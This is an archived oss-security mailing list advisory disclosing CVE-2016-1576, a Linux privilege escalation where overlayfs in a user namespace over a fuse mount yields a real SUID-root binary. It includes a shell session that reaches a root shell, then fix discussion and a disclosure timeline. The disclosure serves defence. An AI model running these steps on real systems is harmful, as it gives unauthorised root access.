X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["4181" "Wednesday" "24" "February" "2016" "06:03:35" "+0000" "halfdog" "me@halfdog.net" "<f16c78c5-5666-5322-2807-b68a8e13356e@halfdog.net>" "117" "[oss-security] Overlayfs over Fuse Privilege Escalation in USERNS" nil nil nil "2" "2016022406:03:35" "[oss-security] Overlayfs over Fuse Privilege Escalation in USERNS" (number mark "U       me@halfdog.n Feb 24  117/4181  " thread-indent "\"[oss-security] Overlayfs over Fuse Privilege Escalation in USERNS\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 9361 invoked by uid 550); 24 Feb 2016 06:09:20 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 9282 invoked from network); 24 Feb 2016 06:09:12 -0000
To: oss-security@lists.openwall.com
From: halfdog <me@halfdog.net>
Message-ID: <f16c78c5-5666-5322-2807-b68a8e13356e@halfdog.net>
Date: Wed, 24 Feb 2016 06:03:35 +0000
User-Agent: Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0
MIME-Version: 1.0
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: 8bit
Subject: [oss-security] Overlayfs over Fuse Privilege Escalation in USERNS

-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1

[http://www.halfdog.net/Security/2016/OverlayfsOverFusePrivilegeEscalation/]

Introduction:
=============

* Problem description:

On Ubuntu Wily it is possible to place an USERNS overlayfs mount over
a fuse mount. The fuse filesystem may contain SUID binaries, but those
cannot be used to gain privileges due to nosuid mount options. But
when touching such an SUID binary via overlayfs mount, this will
trigger copy_up including all file attributes, thus creating a real
SUID binary on the disk.
Methods

Basic exploitation sequence is:

    Mount fuse filesystem exposing one world writable SUID binary
    Create USERNS
    Mount overlayfs on top of fuse
    Open the SUID binary RDWR in overlayfs, thus triggering copy_up

This can be archived, e.g.

test# mkdir fuse
test# mv SuidExec RealFile
test# ./FuseMinimal fuse
test# ./UserNamespaceExec -- /bin/bash
root# mkdir mnt upper work
root# mount -t overlayfs -o lowerdir=fuse,upperdir=upper,workdir=work
overlayfs mnt
root# touch mnt/file
touch: setting times of ‘mnt/file’: Permission denied
root# umount mnt
root# exit
test# fusermount -u fuse
test# ls -al upper/file
- -rwsr-xr-x 1 root root 9088 Jan 22 09:18 upper/file
test# upper/file /bin/bash
root# id
uid=0(root) gid=100(users) groups=100(users)


Results, Discussion:
====================

* Fixing the issue itself:

In my opinion, fuse filesystem allowed pretending to have files with
different UIDs/GIDs in the local mount namespace, but they never had
those properties, those files would have, when really stored on local
disk. So e.g., the SUID binaries lost their SUID-properties and the
owner could also modify arbitrary file content, even if file
attributes were pretending, that he does not have access - by having
control over the fuse process simulating the filesystem, such access
control is futile. That is also the reason, why no other user than the
one mounting the filesystem may have rights to access it by default.

Hence the workarounds should be to restrict access to fuse also only
to the mount namespace where it was created.

* Avoiding numerous namespace issues in future:

In my opinion, enabing USERNS was a little too fast, as it exposes a
lot of additional kernel code to users without any special
capabilities in init-ns by using the elevated privileges within the
container. This is also recognized by others, but there is dispute on
the consequences to draw from that. See Patch to disable unprivileged
userns ... on LKML [0].

I completely second the request to have options to disable the USERNS
layer as it depends on the system type, if USERNS is a net gain
regarding security or a net loss. It should be a gain on systems,
where it allows to perform critical operations within a containment, a
use-case where chroots are used currently. Without USERNS, those
operations are likely to be performed with SUID helpers in the init-ns
or privilege separation might be dropped completely as the overhead is
too large for efficient work procedures.

On the other hand, systems where all processes have similar security
level, e.g. as they all process the same data, further privilege
separation is not easy. The USERNS support will add only new risks here.

Timeline:
=========

* 20160117: Discovery, report at Launchpad [1]
* 20160121: First feedback from Ubuntu, Seth Arnold alreay working on
submitted but not yet accepted upstream patch
* 20160121: Feedback: first patch does not seem sufficient
* 20160122: Patch request to disable unprivileged userns due to this
and other issues LKML [0]
* 20160131: Bugfix by Seth Forshee available on Ubuntu Launchpad
* 20160117: CVE-2016-1576 linked on Launchpad [2]
* 20161122: CRD and publication


References:
===========

[0] https://lkml.org/lkml/2016/1/22/7
[1] https://bugs.launchpad.net/bugs/1535150
[2] http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=2016-1576

- -- 
http://www.halfdog.net/
PGP: 156A AE98 B91F 0114 FE88  2BD8 C459 9386 feed a bee
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1

iEYEARECAAYFAlbNR6wACgkQxFmThv7tq+70lwCfQh6+nQjTnK7NGDkSXSBJEP8o
BnoAni1JcpmoV4s+NzqryJxKwZVTV3dO
=FO71
-----END PGP SIGNATURE-----
